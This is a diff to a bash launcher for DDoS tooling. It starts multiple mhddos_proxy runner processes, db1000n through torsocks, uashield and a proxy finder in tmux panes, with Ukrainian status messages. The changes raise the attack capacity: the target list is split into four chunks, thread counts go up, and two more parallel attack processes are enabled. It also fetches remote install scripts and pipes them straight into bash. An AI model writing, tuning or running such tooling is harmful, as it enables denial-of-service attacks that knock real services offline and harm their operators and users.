@@ -68,7 +68,7 @@ cat $targets_line_by_line | sort | uniq | sort -R > $targets_uniq
 
 #split targets in N files
 cd /var/tmp/
-split -n l/2 --additional-suffix=.uaripper $targets_uniq
+split -n l/4 --additional-suffix=.uaripper $targets_uniq
 cd -
 
 # Print greetings and number of targets (secondary, main, total)
@@ -82,6 +82,7 @@ sleep 0.5
 echo -e "\n" && sleep 0.1
 echo -e "Total targets found:" "\x1b[32m $(cat $targets_line_by_line | wc -l)\x1b[m" && sleep 0.1
 echo -e "Uniq targets:" "\x1b[32m $(cat $targets_uniq | wc -l)\x1b[m" && sleep 0.1
+
 echo -e "\nКількість потоків:" "\x1b[32m $(echo $threads | cut -d " " -f2)\x1b[m" && sleep 0.1
 echo -e "\nЗавантаження..."
 sleep 3
@@ -90,6 +91,7 @@ clear
 export -f prepare_targets_and_banner
 
 launch () {
+
 # kill previous sessions or processes in case they still in memory
 tmux kill-session -t multiddos > /dev/null 2>&1
 sudo pkill node > /dev/null 2>&1
@@ -99,7 +101,10 @@ grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.co
 tmux source-file ~/.tmux.conf > /dev/null 2>&1
 
 if [[ $gotop == "on" ]]; then
-    [[ ! -f "/usr/local/bin/gotop" ]] && curl -L https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb -o gotop.deb; sudo dpkg -i gotop.deb
+    if [ ! -f "/usr/local/bin/gotop" ]; then
+        curl -L https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb -o gotop.deb
+        sudo dpkg -i gotop.deb
+    fi
     tmux new-session -s multiddos -d 'gotop -sc solarized'
     sleep 0.2
     tmux split-window -h -p 66 'bash auto_bash.sh'
@@ -108,10 +113,28 @@ else
     tmux new-session -s multiddos -d 'bash auto_bash.sh'
 fi
 
-[[ $vnstat == "on" ]] && sudo apt -yq install vnstat; sleep 0.2; tmux split-window -v 'vnstat -l'
-[[ $db1000n == "on" ]] && sudo apt -yq install torsocks; sleep 0.2; tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
-[[ $uashield == "on" ]] && sleep 0.2; tmux split-window -v 'curl -L https://github.com/opengs/uashield/releases/download/v1.0.3/shield-1.0.3.tar.gz -o shield.tar.gz && tar -xzf shield.tar.gz --strip 1 && ./shield'
-[[ $proxy_finder == "on" ]] && sleep 0.2; tmux split-window -v -p 20 'rm -rf ~/multidd/proxy_finder; git clone https://github.com/porthole-ascend-cinnamon/proxy_finder ~/multidd/proxy_finder; cd ~/multidd/proxy_finder; python3 -m pip install -r requirements.txt; clear; echo "proxy threads:" $proxy_threads; python3 ~/multidd/proxy_finder/finder.py --threads $proxy_threads'
+if [[ $vnstat == "on" ]]; then
+sudo apt -yq install vnstat
+sleep 0.2
+tmux split-window -v 'vnstat -l'
+fi
+
+if [[ $db1000n == "on" ]]; then
+sudo apt -yq install torsocks
+sleep 0.2
+tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
+fi
+
+if [[ $uashield == "on" ]]; then
+sleep 0.2
+tmux split-window -v 'curl -L https://github.com/opengs/uashield/releases/download/v1.0.3/shield-1.0.3.tar.gz -o shield.tar.gz && tar -xzf shield.tar.gz --strip 1 && ./shield'
+fi
+
+if [[ $proxy_finder == "on" ]]; then
+sleep 0.2
+tmux split-window -v -p 20 'rm -rf ~/multidd/proxy_finder; git clone https://github.com/porthole-ascend-cinnamon/proxy_finder ~/multidd/proxy_finder; cd ~/multidd/proxy_finder; python3 -m pip install -r requirements.txt; clear; echo "proxy threads:" $proxy_threads; python3 ~/multidd/proxy_finder/finder.py --threads $proxy_threads'
+fi
+
 #tmux -2 attach-session -d
 }
 
@@ -142,11 +165,11 @@ while [ "$1" != "" ]; do
     esac
 done
 
-# assign auto calculated threads value if it wasn't assidgned as -t in command line
-# threads = number of cores * 200
+#assign auto calculated threads value if it wasn't assidgned as -t in command line
+#threads = number of cores * 200
 if [[ $t_set_manual != "on" ]]; then 
     if [[ $(nproc --all) -le 8 ]]; then
-        threads="-t $(expr $(nproc --all) "*" 150)"
+        threads="-t $(expr $(nproc --all) "*" 200)"
     elif [[ $(nproc --all) -gt 8 ]]; then
         threads="-t 1600"
     else
@@ -179,10 +202,10 @@ echo "threads: "$threads; echo "methods: "$methods
         python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $threads $methods&
         sleep 10 # to decrease load on cpu during simultaneous start
         python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $threads $methods&
-        # sleep 10 # to decrease load on cpu during simultaneous start
-        # python3 ~/multidd/mhddos_proxy/runner.py -c $t3 $threads $methods&
-        # sleep 10 # to decrease load on cpu during simultaneous start
-        # python3 ~/multidd/mhddos_proxy/runner.py -c $t4 $threads $methods&
+        sleep 10 # to decrease load on cpu during simultaneous start
+        python3 ~/multidd/mhddos_proxy/runner.py -c $t3 $threads $methods&
+        sleep 10 # to decrease load on cpu during simultaneous start
+        python3 ~/multidd/mhddos_proxy/runner.py -c $t4 $threads $methods&
 sleep 30m
 prepare_targets_and_banner
 done
